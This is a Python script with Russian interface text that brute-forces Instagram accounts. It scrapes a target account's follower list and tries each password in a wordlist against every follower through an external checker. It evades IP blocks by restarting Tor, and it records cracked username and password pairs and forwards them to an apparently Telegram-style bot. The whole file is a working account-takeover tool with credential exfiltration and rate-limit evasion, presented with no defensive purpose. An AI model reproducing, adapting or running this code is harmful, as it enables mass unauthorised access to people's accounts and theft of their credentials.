#!/usr/bin/env python3
from instagram import Account, Media, WebAgent ,WebAgentAccount
import subprocess
import os
import time
import requests as r
import bot1
from sys import argv

vocabulary="voc/date"

selFile=""

def createAclist(agent,agentpass,accountName):
  agent = WebAgentAccount(agent)
  agent.auth(agentpass)
  account = Account(accountName)
  agent.update()
  
  print("please waite...") 

  f, pointer = agent.get_followers(account)
  f2, pointer = agent.get_followers(account,pointer=pointer, count=account.followers_count, delay=1)
  followers = f+f2
  file1 = open('saves/'+accountName,'w')
  for el in followers:
   print(el)
   file1.write(str(el)+'\n')

def getAclist():
  AcList=[]
  files=os.listdir('saves')
  i=0
  for f in files:
    print(str(i)+': '+f)
    i=i+1
  sel=int(input('Введите номер: '))
  global selFile
  selFile=files[sel]
  f = open('saves/'+files[sel])
  for line in f:
      AcList.append(line)
  return AcList

def getLastLine(path):
    rez=open(path,'r').read().split('\n')
    return rez[-2]


def chechAc(user,password):
  try:
    return str(subprocess.check_output(['./checkAc', user, password]))
  except:
    print("Not connect!!!")
    bot1.delmsg()
    exit(1)

def save(user,password):
  print("saving...")
  open('founded','a').write(user+" : "+password+"\n")
  bot1.send(user+"\n"+password)

def brootforcer(user,voc):
  f = open(voc)
  for password in f:
    password=password.replace("\n", "")
    print("user:"+user+" trying:"+password)
    out = chechAc(user, password)
    while (("ip_block" in out) or ("Please wait" in out)):
      print("ip changing...")
      os.system("killall -HUP tor");
      time.sleep(1)
      out = chechAc(user, password)
    if (("challenge_required" in out) or ("logged_in_user" in out)):
      print("secssefull")
      save(user,password)
      break

def main(userlist,voc):
  for user in userlist:
     open('cfg/restore','w').write(selFile+'\n'+user)
     bot1.updateinfo("Обработка: "+user)
     user=user.replace("\n", "")
     brootforcer(user,voc)

def restore():
  global selFile
  AcList=[]
  data=open('cfg/restore','r').read().split('\n')
  selFile=data[0]
  f = open('saves/'+data[0])
  for line in f:
      AcList.append(line)
  i=AcList.index(data[1]+'\n')
  AcList=AcList[i:-1]
  main(AcList,vocabulary)


if (len(argv)==1):
  bot1.init()
  AcList=getAclist()
  main(AcList,vocabulary)
elif (argv[1]=="-r"):
  bot1.init()
  restore()
elif (argv[1]=="--newlist"):
  createAclist(input("username вашего аккаунта: "),input("Пароль Вашего аккаунта: "),input("username цели: "))
elif (argv[1]=="--newbot"):
  bot1.setToken(argv[2])
elif (argv[1]=="--help"):
  print("--newlist создать список аккаунтов")
  print("--newbot подключить бота")
  print("-r продолжить с места остановки")
